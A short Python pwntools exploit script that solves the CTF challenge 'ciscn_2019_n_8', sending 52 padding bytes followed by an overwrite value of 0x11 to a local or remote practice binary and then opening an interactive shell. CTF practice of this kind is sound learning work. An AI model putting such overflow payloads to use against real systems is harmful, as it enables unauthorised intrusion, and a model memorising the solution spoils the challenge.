from pwn import *
import string
context.binary = './ciscn_2019_n_8'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


def dbg():
	raw_input()


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20144)
	libc = ELF('../x86_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_2019_n_8')
	#gdb.attach(p)
	dbg()


p.recvline()
payload = 'a'*52 + '\x11\x00\x00\x00\x00\x00\x00\x00'
p.sendline(payload)



p.interactive()
p.close()